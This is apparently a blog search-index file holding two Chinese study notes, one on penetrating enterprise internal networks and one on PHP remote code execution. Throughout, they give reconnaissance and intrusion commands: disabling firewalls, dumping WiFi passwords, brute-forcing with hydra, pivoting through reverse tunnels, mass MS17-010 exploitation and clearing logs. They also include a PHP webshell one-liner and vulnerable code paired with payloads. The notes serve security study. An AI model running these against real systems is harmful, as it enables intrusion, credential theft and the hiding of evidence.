<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>内网渗透笔记(大致框架)</title>
    <url>/2020/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="企业内网渗透"><a href="#企业内网渗透" class="headerlink" title="企业内网渗透"></a>企业内网渗透</h1><h2 id="1-企业内网基础知识"><a href="#1-企业内网基础知识" class="headerlink" title="1. 企业内网基础知识"></a>1. 企业内网基础知识</h2><h3 id="基本术语"><a href="#基本术语" class="headerlink" title="基本术语"></a>基本术语</h3><ul>
<li>内网：局域网。</li>
<li>工作组：将不同的电脑一般按功能（或部门）分别列入不同的工作组中。</li>
<li>域（domain）：有安全边界的计算机集合<ul>
<li>也可简单的把域理解成升级版的”工作组”，相比于工作组而言，它有更加严格的安全管理控制机制。</li>
</ul>
</li>
<li>域控（Domain Controller,简称DC）是一个域中的一台类似管理服务器的计算机，一般一个域内至少两台域服务器，一个DC另一个备份DC。</li>
<li>单域：在一般的具有固定地理位置的小公司里，建立一个域就足够。</li>
<li>父域：多个域中的第一个域。</li>
<li>子域：多个域中除父域外的域。</li>
<li>域树：若干个域通过建立信任关系组成的集合，一个域管理员只能管理本域的内部，不能访问或者管理其他域，两个域之间相互访问则需要建立信任关系（Trust Relation）。</li>
<li>信任关系：连接不同域之间的桥梁。</li>
<li>域名：在一个域树中，父域可以包含很多子域，子域是相对于父域来说的，指域名中的每一个段。子域只能使用父域作为域名的后缀，也就是说在一个域树中，域的名字是连续的。</li>
<li>DNS域名服务器：进行域名和与之对应IP地址转换的服务器，通常DNS服务器和域控制器会处于同一台机器上。</li>
<li>活动目录（Active Directory）：是域环境提供目录服务的组件，一般在域控（DC）上。<ul>
<li>活动目录和工作组是基于WINDOWS的局域网中两种不同的网络管理模式；<ul>
<li>工作组以计算机为管理单元，各计算机管理员身份的用户在资源共享上具有自主。一般是小型网络采取这种组建模式居多。</li>
<li>活动目录是大中型网络的管理模式，是典型的以用户为单位的管理模式。</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="2-企业内网渗透思路"><a href="#2-企业内网渗透思路" class="headerlink" title="2. 企业内网渗透思路"></a>2. 企业内网渗透思路</h2><ul>
<li>思路主要有两种（主要讲第一种）：<ol>
<li>攻击外网服务器，获得权限，当作跳板进而攻击内网服务器；</li>
<li>攻击办公网的系统，办公网电脑，办公网无线等方式，一般采用社工，实现控制办公电脑，再控制各种服务器。</li>
</ol>
</li>
<li>一般内网安全检查使用第一种思路，实际攻击两种思路结合</li>
</ul>
<h2 id="3-企业内网敏感资料-数据-信息："><a href="#3-企业内网敏感资料-数据-信息：" class="headerlink" title="3. 企业内网敏感资料/数据/信息："></a>3. 企业内网敏感资料/数据/信息：</h2><ul>
<li>高管/系统管理员/财务/人事/业务人员的个人电脑</li>
<li>文件服务器/共享服务器</li>
<li>邮件服务器</li>
<li>OA服务器</li>
<li>数据库服务器</li>
</ul>
<h2 id="4-攻击过程"><a href="#4-攻击过程" class="headerlink" title="4. 攻击过程"></a>4. 攻击过程</h2><h3 id="4-1-信息收集"><a href="#4-1-信息收集" class="headerlink" title="4.1. 信息收集"></a>4.1. 信息收集</h3><h4 id="4-1-1-手工收集"><a href="#4-1-1-手工收集" class="headerlink" title="4.1.1 手工收集"></a>4.1.1 手工收集</h4><h5 id="网络配置信息"><a href="#网络配置信息" class="headerlink" title="网络配置信息"></a>网络配置信息</h5><pre><code>ip网关信息查询`ipconfig /all`||`ip add、ifconfig`
dns服务器查询`nslookup`</code></pre><h5 id="操作系统机软件信息"><a href="#操作系统机软件信息" class="headerlink" title="操作系统机软件信息"></a>操作系统机软件信息</h5><h6 id="操作系统和版本信息"><a href="#操作系统和版本信息" class="headerlink" title="操作系统和版本信息"></a>操作系统和版本信息</h6><ul>
<li><code>systeminfo | findstr /B /C:&quot;OS Name&quot; /C &quot;OS Version&quot;</code></li>
<li><code>systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot;</code></li>
<li>linux:<code>uname -a</code><h6 id="安装的软件及版本"><a href="#安装的软件及版本" class="headerlink" title="安装的软件及版本"></a>安装的软件及版本</h6></li>
<li><code>wmic product get name,version</code></li>
<li><code>powershell &quot;Get-WmiObject -class Win32_Product | Select-Object -Property name,version&quot;</code></li>
<li>linux:<code>rpm -qa</code><h5 id="查询本机服务"><a href="#查询本机服务" class="headerlink" title="查询本机服务"></a>查询本机服务</h5></li>
<li><code>wmic service list brief</code></li>
<li>linux:<code>service –status -all</code><h5 id="查询进程列表"><a href="#查询进程列表" class="headerlink" title="查询进程列表"></a>查询进程列表</h5></li>
<li><code>tasklist</code></li>
<li>linux<code>ps aux、ps -ef、top</code><h5 id="查看进程信息"><a href="#查看进程信息" class="headerlink" title="查看进程信息"></a>查看进程信息</h5></li>
<li><code>wmic process list brief</code></li>
<li>常见的杀毒软件的进程：<br>  360sd.exe    360杀毒<br>  360tray.exe    360实时保护<br>  ZhuDongFangYu.exe    360主动防御<br>  KSafeTray.exe    金山卫士<br>  SafeDogUpdateCenter.exe    服务器安全狗<br>  McAfee McShield.exe    McAfee<br>  AVP.EXE    卡巴斯基<br>  avguard.exe    小红伞<br>  bdagent.exe    BitDefender</li>
<li>linux<code>ps aux、ps -ef、top</code><h5 id="查看启动程序信息"><a href="#查看启动程序信息" class="headerlink" title="查看启动程序信息"></a>查看启动程序信息</h5></li>
<li><code>wmic startup get command,caption</code></li>
<li>linux:<code>chkconfig --list</code><h5 id="查看用户列表、当前权限"><a href="#查看用户列表、当前权限" class="headerlink" title="查看用户列表、当前权限"></a>查看用户列表、当前权限</h5></li>
<li><code>net user、whoami、net user 用户名、echo %username%</code></li>
<li><code>who、whoami、cat /etc/passwd|grep -v nologin|grep -v halt|grep -v shutdown|awk -F&quot;:&quot; &#39;{ print $1&quot;|&quot;$3&quot;|&quot;$4 }&#39;|more</code><h5 id="获取本地管理员信息"><a href="#获取本地管理员信息" class="headerlink" title="获取本地管理员信息"></a>获取本地管理员信息</h5></li>
<li><code>net localgroup administrators</code><h5 id="查看在线用户-win-server-2008"><a href="#查看在线用户-win-server-2008" class="headerlink" title="查看在线用户(win server 2008)"></a>查看在线用户(win server 2008)</h5></li>
<li><code>query user || qwinsta</code></li>
<li>Linux:<code>w</code><h5 id="端口列表"><a href="#端口列表" class="headerlink" title="端口列表"></a>端口列表</h5></li>
<li><code>netstat -ano</code></li>
<li>Linux:<code>netstat -ntulp</code><h5 id="系统详细信息"><a href="#系统详细信息" class="headerlink" title="系统详细信息"></a>系统详细信息</h5></li>
<li><code>systeminfo</code><h5 id="安装补丁信息"><a href="#安装补丁信息" class="headerlink" title="安装补丁信息"></a>安装补丁信息</h5></li>
<li><code>wmic qfe get Caption,Description,HotFixID,InstalledOn</code></li>
<li><code>wmic qfe list full</code><h5 id="本机共享列表"><a href="#本机共享列表" class="headerlink" title="本机共享列表"></a>本机共享列表</h5></li>
<li><code>net share</code></li>
<li><code>wmic share get name,path,status</code></li>
<li>Linux:<code>smbclient -L //IP [-U 用户名]</code><h5 id="路由表"><a href="#路由表" class="headerlink" title="路由表"></a>路由表</h5></li>
<li><code>route print</code></li>
<li>Linux:<code>route -n</code><h5 id="arp缓存"><a href="#arp缓存" class="headerlink" title="arp缓存"></a>arp缓存</h5></li>
<li><code>arp -a</code> linux一样<h5 id="防火墙配置"><a href="#防火墙配置" class="headerlink" title="防火墙配置"></a>防火墙配置</h5></li>
<li><code>netsh firewall show config</code></li>
<li><code>netsh advfirewall set allprofiles state off</code>  —关闭防火墙,需要管理员身份</li>
<li>Linux:<code>firewall-cmd --state</code></li>
<li>Linux:<code>systemctl stop firewalld.service</code><h5 id="内网网络信息，无线网络"><a href="#内网网络信息，无线网络" class="headerlink" title="内网网络信息，无线网络"></a>内网网络信息，无线网络</h5></li>
<li><code>netsh wlan show profiles</code></li>
<li><code>netsh wlan show profile name=“网络链接配置文件” key=clear</code> –查看wifi密码</li>
<li><code>ls /etc/NetworkManager/system-connections</code></li>
<li><code>cat /etc/NetworkManager/system-connections/wifi配置文件</code><h5 id="域信息收集"><a href="#域信息收集" class="headerlink" title="域信息收集"></a>域信息收集</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Net use</span><br><span class="line">Net view</span><br><span class="line">Tasklist &#x2F;v</span><br><span class="line">Ipconfig &#x2F;all </span><br><span class="line">net group &#x2F;domain 获得所有域用户组列表</span><br><span class="line">net group “domain admins” &#x2F;domain 获得域管理员列表</span><br><span class="line">net group “enterprise admins” &#x2F;domain 获得企业管理员列表</span><br><span class="line">net localgroup administrators &#x2F;domain 获取域内置administrators组用户（enterprise admins、domain admins）</span><br><span class="line">net group “domain controllers” &#x2F;domain 获得域控制器列表</span><br><span class="line">net group “domain computers” &#x2F;domain 获得所有域成员计算机列表</span><br><span class="line">net user &#x2F;domain 获得所有域用户列表</span><br><span class="line">net user someuser &#x2F;domain 获得指定账户someuser的详细信息</span><br><span class="line">net accounts &#x2F;domain 获得域密码策略设置，密码长短，错误锁定等信息</span><br><span class="line">nltest &#x2F;domain_trusts 获取域信任信息</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h4 id="4-1-2-脚本-工具收集"><a href="#4-1-2-脚本-工具收集" class="headerlink" title="4.1.2 脚本/工具收集"></a>4.1.2 脚本/工具收集</h4><p>wmic脚本（windows）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for &#x2F;f &quot;delims&#x3D;&quot; %%A in (&#39;dir &#x2F;s &#x2F;b %WINDIR%\system32\*htable.xsl&#39;) do set &quot;var&#x3D;%%A&quot;</span><br><span class="line"></span><br><span class="line">wmic process get CSName,Description,ExecutablePath,ProcessId &#x2F;format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic service get Caption,Name,PathName,ServiceType,Started,StartMode,StartName &#x2F;format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic USERACCOUNT list full &#x2F;format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic group list full &#x2F;format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic nicconfig where IPEnabled&#x3D;&#39;true&#39; get Caption,DefaultIPGateway,Description,DHCPEnabled,DHCPServer,IPAddress,IPSubnet,MACAddress &#x2F;format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic volume get Label,DeviceID,DriveLetter,FileSystem,Capacity,FreeSpace &#x2F;format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic netuse list full &#x2F;format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn &#x2F;format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic startup get Caption,Command,Location,User &#x2F;format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic PRODUCT get Description,InstallDate,InstallLocation,PackageCache,Vendor,Version &#x2F;format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic os get name,version,InstallDate,LastBootUpTime,LocalDateTime,Manufacturer,RegisteredUser,ServicePackMajorVersion,SystemDirectory &#x2F;format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic Timezone get DaylightName,Description,StandardName &#x2F;format:&quot;%var%&quot; &gt;&gt; out.html</span><br></pre></td></tr></table></figure>
<p>在当前目录下输出out.html文件，输出信息探测内容</p>
<h5 id="网络环境判断"><a href="#网络环境判断" class="headerlink" title="网络环境判断"></a>网络环境判断</h5><ul>
<li>判断计算机所在位置的区域</li>
<li>判断计算机在内网中的角色</li>
</ul>
<h5 id="主机发现（可能会禁ping）"><a href="#主机发现（可能会禁ping）" class="headerlink" title="主机发现（可能会禁ping）"></a>主机发现（可能会禁ping）</h5><ul>
<li><p>Linux下</p>
<ul>
<li>使用工具<code>namp -sP 内网网段</code>，<code>netdiscover -r 网段 -i 网卡</code>(使用跳板代理)</li>
<li>编写sh脚本<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment">###############################</span></span><br><span class="line"><span class="comment">##for循环ping文本中的IP</span></span><br><span class="line"><span class="comment">##</span></span><br><span class="line"><span class="comment">##############################</span></span><br><span class="line"><span class="comment">#设置变量</span></span><br><span class="line">list=`cat $(<span class="built_in">pwd</span>)/ip.txt`</span><br><span class="line"><span class="comment">#for循环遍历文本中的内容</span></span><br><span class="line"><span class="keyword">for</span> ip <span class="keyword">in</span> <span class="variable">$list</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="comment">#ping一次，超时时间1秒 混合输出导入到/dev/null，不需要看过程</span></span><br><span class="line">    ping -c 1 -W1  <span class="variable">$ip</span> &gt;/dev/null 2&gt;1</span><br><span class="line"><span class="comment">#ping成功的返回码为0,echo一个up，ping失败则echodown</span></span><br><span class="line">    <span class="keyword">if</span> [ $? -eq 0 ];<span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"<span class="variable">$ip</span> is up...."</span></span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"<span class="variable">$ip</span> is down...."</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>windows下</p>
<ul>
<li>使用工具<code>nbtscan.exe -n 网段</code>（跳板代理）</li>
<li>编写bat脚本<figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="built_in">set</span> /p ip="<span class="built_in">set</span> ip <span class="built_in">net</span>,the <span class="built_in">format</span>:"<span class="number">10</span>.<span class="number">10</span>.<span class="number">10</span>." &gt;&gt;&gt; "</span><br><span class="line"><span class="keyword">for</span> /L <span class="variable">%%i</span> <span class="keyword">in</span> (<span class="number">1</span>,<span class="number">1</span>,<span class="number">254</span>) <span class="keyword">do</span> (</span><br><span class="line"><span class="built_in">ping</span>.exe -n <span class="number">1</span> -w <span class="number">10</span> <span class="variable">%ip%</span><span class="variable">%%i</span> | <span class="built_in">findstr</span> "TTL" &gt;&gt; ipscan.txt</span><br><span class="line">)</span><br><span class="line"><span class="built_in">type</span> ipscan.txt</span><br><span class="line"><span class="built_in">pause</span></span><br></pre></td></tr></table></figure>

</li>
</ul>
</li>
</ul>
<h5 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h5><ul>
<li>windows下Powershell脚本（windows下后缀名为.sp1）<ul>
<li>powershell执行策略：默认情况下，脚本无法执行。需要手动更改 Set-ExecutionPolicy RemoteSigned</li>
<li><code>.\IPv4PortScan.ps1 -ComputerName fritz.box -EndPort 500</code>,<a href="https://github.com/BornToBeRoot/PowerShell_IPv4PortScanner/blob/master/Scripts/IPv4PortScan.ps1" target="_blank" rel="noopener">脚本github地址</a></li>
</ul>
</li>
<li>跳板代理后使用nmap扫描(4.3后渗透部分)</li>
</ul>
<hr>
<h3 id="4-2-漏洞验证-漏洞攻击"><a href="#4-2-漏洞验证-漏洞攻击" class="headerlink" title="4.2. 漏洞验证/漏洞攻击"></a>4.2. 漏洞验证/漏洞攻击</h3><h4 id="4-2-1-web常见漏洞"><a href="#4-2-1-web常见漏洞" class="headerlink" title="4.2.1 web常见漏洞"></a>4.2.1 web常见漏洞</h4><ul>
<li>基础知识</li>
</ul>
<h4 id="4-2-2-中间件漏洞"><a href="#4-2-2-中间件漏洞" class="headerlink" title="4.2.2. 中间件漏洞"></a>4.2.2. 中间件漏洞</h4><ul>
<li>可在线检索学习</li>
<li><a href="https://www.freebuf.com/articles/web/192063.html" target="_blank" rel="noopener">参考</a></li>
</ul>
<h4 id="4-2-3-web框架"><a href="#4-2-3-web框架" class="headerlink" title="4.2.3. web框架"></a>4.2.3. web框架</h4><ul>
<li>struts2远程代码执行</li>
<li>ThinkPHP任意代码执行</li>
<li>等等在线检索学习</li>
</ul>
<h4 id="4-2-4-数据库"><a href="#4-2-4-数据库" class="headerlink" title="4.2.4. 数据库"></a>4.2.4. 数据库</h4><ul>
<li>MYSQL数据库<ul>
<li>端口3306</li>
<li>攻击方式：<ul>
<li>弱口令爆破</li>
<li>身份认证漏洞：CVE-2012-2122</li>
<li>拒绝服务攻击</li>
<li>phpmyadmin万能密码绕过，用户名：‘localhost’@‘@” 密码任意</li>
</ul>
</li>
</ul>
</li>
<li>MSSQL数据库<ul>
<li>端口1433（Server数据库服务）、1434（monitor数据库监控）</li>
<li>攻击方式：<ul>
<li>弱口令爆破</li>
<li>远程代码执行：CVE-2018-8273</li>
<li><a href="https://www.anquanke.com/post/id/86011" target="_blank" rel="noopener">参考</a></li>
</ul>
</li>
</ul>
</li>
<li>Oracle数据库<ul>
<li>默认端口：1521（数据库端口）、1158（Oracle EMCTL端口）、8080（Oracle XDB数据库）、210（Oracle XDB FTP服务）</li>
<li>攻击方法：<ul>
<li>爆破：弱口令</li>
<li>注入攻击；</li>
<li><a href="https://www.leiphone.com/news/201711/JjzXFp46zEPMvJod.html" target="_blank" rel="noopener">参考</a></li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="4-2-5-常见服务-协议"><a href="#4-2-5-常见服务-协议" class="headerlink" title="4.2.5. 常见服务/协议"></a>4.2.5. 常见服务/协议</h4><ul>
<li><p>ftp服务</p>
<ul>
<li>分为两种：一种是使用软件（iis）配置，一种是第三方软件（serv-u）配置</li>
<li>默认端口：20（数据端口），21（控制端口）；69（tftp小型文件传输协议）</li>
<li>攻击方式：<ul>
<li>爆破：<ul>
<li>hydra：<code>hydra -l username -P password.txt ftp://ip</code></li>
<li>msf爆破模块：<code>msf-&gt;search ftp_login-&gt;use -&gt;show options-&gt; set -&gt;exploit</code></li>
</ul>
</li>
<li>匿名访问</li>
<li>后门vfstp</li>
<li>ftp远程代码溢出</li>
</ul>
</li>
</ul>
</li>
<li><p>samba服务</p>
<ul>
<li>端口为139</li>
<li>攻击方式：远程代码执行<ul>
<li>msf：版本探测<code>msf-&gt;search smb_version-&gt;use -&gt;show options-&gt;set -&gt;exploit</code>,版本漏洞查询<code>searchsploit smb version</code>,找到漏洞利用文件（.c），编译<code>gcc -o smb-exp 漏洞利用源码</code>，<code>chmod +x smb-exp</code>执行。</li>
</ul>
</li>
</ul>
</li>
<li><p>ssh服务</p>
<ul>
<li>端口22</li>
<li>攻击方式<ul>
<li>爆破</li>
<li>28退格漏洞</li>
<li>OpenSSL（C语言函数库，对ssl协议的实现）漏洞，使用<code>searchsploit</code>查询漏洞利用代码,与smb利用类似</li>
<li>openssh（对ssh协议的实现，其中openssh依赖于openssl）用户枚举</li>
</ul>
</li>
</ul>
</li>
<li><p>rdp远程桌面（windows）</p>
<ul>
<li>端口3389</li>
<li>开启3389（拿到webshell后的提权之路）：<ul>
<li>.exe工具</li>
<li>.vbs脚本</li>
<li>.bat脚本</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="4-2-5-常见的web应用系统漏洞"><a href="#4-2-5-常见的web应用系统漏洞" class="headerlink" title="4.2.5. 常见的web应用系统漏洞"></a>4.2.5. 常见的web应用系统漏洞</h4><ul>
<li>cms应用漏洞(在线检索以及学习积累)</li>
</ul>
<hr>
<h3 id="4-3-后渗透"><a href="#4-3-后渗透" class="headerlink" title="4.3. 后渗透"></a>4.3. 后渗透</h3><p><em>应用场景：外网主机A（攻击者）,内网主机B（拿下权限的跳板）,内网主机C（目标主机），A可访问B,A不可访问C。</em></p>
<h4 id="4-3-1-端口转发（跳板）"><a href="#4-3-1-端口转发（跳板）" class="headerlink" title="4.3.1. 端口转发（跳板）"></a>4.3.1. 端口转发（跳板）</h4><ul>
<li>端口映射：将内网主机开放的内部端口映射到外网主机（有公网IP的主机）任意端口，提供相应的服务。</li>
<li>端口转发：通过端口从一个网络节点转发到另一个网络节点，通常是把内网的端口转发到外网的主机，搭建隧道，即能实现从外网访问内网资源。</li>
</ul>
<hr>
<ul>
<li>lcx工具端口转发(常用于防火墙对3389的限制下)<ol>
<li>A上监听：<code>lcx.exe -listen A_port(x) A_port(y)</code>,将监听的端口x转发到本地端口y。</li>
<li>拿下权限的跳板B上转发：<code>lcx.exe -slave A_ip A_port(x) C_ip port_(z)</code>，将C的端口z转发到A的端口x上。</li>
<li>此时A访问本机的端口y即访问C的端口z。</li>
</ol>
</li>
</ul>
<h4 id="4-3-2-内网穿透"><a href="#4-3-2-内网穿透" class="headerlink" title="4.3.2. 内网穿透"></a>4.3.2. 内网穿透</h4><ul>
<li>代理（proxy）：网络代理，特殊的网络服务，允许一个网络终端通过这个服务与另外一个网络终端进行非直接的连接。</li>
<li>代理类别：<ul>
<li>http代理</li>
<li>socks代理</li>
<li>ftp代理</li>
<li>telnet代理</li>
<li>ssl代理</li>
</ul>
</li>
</ul>
<hr>
<ul>
<li><p>EarthWorm</p>
<ul>
<li><p>正向代理<br>跳板主机上没有任何防火墙策略限制端口或者允许端口x的流量</p>
<ol>
<li>在跳板机B上执行：<code>ew -s ssocksd -l port_x</code>,开启代理服务，任何连接代理的主机可以获取跳板机B的可访问资源。</li>
<li>A上连接代理 <code>B_ip:port_x</code>（windows下Proxifier，SocksCap等代理连接工具，linux使用proxychains，<strong>但是proxychains不支持udp和icmp协议，使用nmap时注意使用-Pn -sT</strong>）</li>
</ol>
</li>
<li><p>反向代理</p>
<ol>
<li>在A上监听：<code>ew -s rcsocks -e port_x -l port_y</code>,监听端口x和y，攻击者A访问端口y,跳板访问端口x</li>
<li>在跳板机B上反向连接：<code>ew -s rssocks -d ip_A -e port_x</code></li>
<li>A使用代理连工具连接代理 <code>A_ip:port_y</code>（windows下Proxifier，SocksCap等代理连接工具，linux使用proxychains,<strong>但是proxychains不支持udp和icmp协议，使用nmap时注意使用-Pn -sT</strong>）</li>
</ol>
</li>
</ul>
</li>
</ul>
<h4 id="4-3-3-Metasploit框架"><a href="#4-3-3-Metasploit框架" class="headerlink" title="4.3.3 Metasploit框架"></a>4.3.3 Metasploit框架</h4><p><em>应用场景：已拿下跳板机（内网服务器）的权限(已用meterpreter模块已拿到shell)，发现内网有大量的存在ms17-010漏洞主机</em></p>
<ol>
<li>查看已拿下目标主机的内网ip段情况:<code>run get_local_subnets</code></li>
<li>添加目标内网的静态路由：<code>run autoroute -s 网段</code>,查看是否成功添加<code>run autoroute -p</code>,将session放入后台<code>backgroud</code></li>
<li>使用ms17-010漏洞利用模块：<code>use exploit/windows/smb/ms17_010_eternalblue</code>,设置目标网段参数进行批量攻击<code>set rhosts 目标网段</code>，获取多个<code>session</code></li>
</ol>
<h3 id="4-4-日志清理"><a href="#4-4-日志清理" class="headerlink" title="4.4. 日志清理"></a>4.4. 日志清理</h3><p>  对于白帽而言，这不是研究的重点。<br>  meterpreter会话下<code>clearev</code></p>
]]></content>
      <categories>
        <category>学习</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>RCE</title>
    <url>/2020/03/12/RCE/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="RCE：命令执行漏洞"><a href="#RCE：命令执行漏洞" class="headerlink" title="RCE：命令执行漏洞"></a>RCE：命令执行漏洞</h1><h2 id="1-命令注入"><a href="#1-命令注入" class="headerlink" title="1.命令注入"></a>1.命令注入</h2><ul>
<li>系统命令执行函数引用了用户可控变量且未进行过滤,注入恶意系统命令，可以使用命令连接符：|，||，&amp;，&amp;&amp;</li>
<li>常见函数：<pre><code>php中的 `exec(),system(),passthru(),shell_exec()...`</code></pre></li>
</ul>
<hr>
<h2 id="2-代码注入"><a href="#2-代码注入" class="headerlink" title="2.代码注入"></a>2.代码注入</h2><ul>
<li><p>代码注入函数引用了用户可控变量且未进行过滤，注入恶意脚本代码，常用的一句话木马就是人为生产的代码注入漏洞</p>
</li>
<li><p>常见函数</p>
<pre><code>php中的 `assert(),eval(),preg_replace(),create_function(),array_map(),call_user_func(),call_user_func_array()...`</code></pre><ul>
<li><p>案例1</p>
<p>  <code>eval()</code>函数:将字符串作为php代码执行，常见的一句话木马：<code>&lt;?php eval($_POST[cmd]);?&gt;</code>cmd就是一句话木马的密码。</p>
</li>
<li><p>案例2</p>
<p>  <code>assert()</code>动态函数，<code>php代码：&lt;?php
  $_GET[0]($_REQUEST[1]);
  ?&gt;,  payload:?0=assert&amp;1=phpinfo()</code>,此处assert不可替换成eval,因为assert是动态函数，其中菜刀连接的链接为<code>http://ip/RCE/index.php?0=assert</code>,密码为 <code>1</code></p>
</li>
<li><p>案例3</p>
<p>  <code>preg_replace()</code>执行一个正则表达式的搜索和替换，如果正则表达式中有e修正符，则第二个参数的字符串当作php代码执行<code>&lt;?php echo preg_replace(&quot;/test/e&quot;,$_POST[cmd],&quot;something test&quot;);?&gt;</code><br>  cmd就是一句话木马的密码。</p>
</li>
<li><p>案例4 </p>
<p>  <code>creat_function()</code><br>  php代码</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$code &#x3D; $_REQUEST[cmd];</span><br><span class="line">$str &#x3D; &#39;echo test&#39;.$code.&quot;;&quot;;</span><br><span class="line">$x&#x3D;create_function(&#39;$code&#39;,$str);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>  payload:<code>http://ip/RCE/index.php?cmd=1;}phpinfo();/*</code>注意闭合<code>creat_function()</code>函数</p>
</li>
<li><p>案例5</p>
<p>  <code>array_map()</code><br>  php代码</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$eval_func&#x3D;$_REQUEST[func];</span><br><span class="line">$eval_cmd &#x3D; $_REQUEST[cmd];</span><br><span class="line">$arr[0]&#x3D;$eval_cmd;</span><br><span class="line">$new_arr &#x3D; array_map($eval_func,$arr);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>  payload:<code>http://ip/RCE/index.php?func=system&amp;cmd=whoami</code></p>
</li>
<li><p>案例6</p>
<p>  <code>call_user_func()</code><br>  php代码</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$eval_func&#x3D;$_REQUEST[func];</span><br><span class="line">$eval_cmd &#x3D; $_REQUEST[cmd];</span><br><span class="line">call_user_func($eval_func,$eval_cmd);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>  payload:<code>http://ip/RCE/index.php?func=system&amp;cmd=whoami</code></p>
</li>
<li><p>案例7</p>
<p>  <code>call_user_func_array()</code><br>  php代码</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$eval_func&#x3D;$_REQUEST[func];</span><br><span class="line">$eval_cmd &#x3D; $_REQUEST[cmd];</span><br><span class="line">call_user_func_array($eval_func,array($eval_cmd));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>  payload:<code>http://ip/RCE/index.php?func=system&amp;cmd=whoami</code></p>
</li>
</ul>
</li>
</ul>
<hr>
]]></content>
      <categories>
        <category>学习</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
</search>
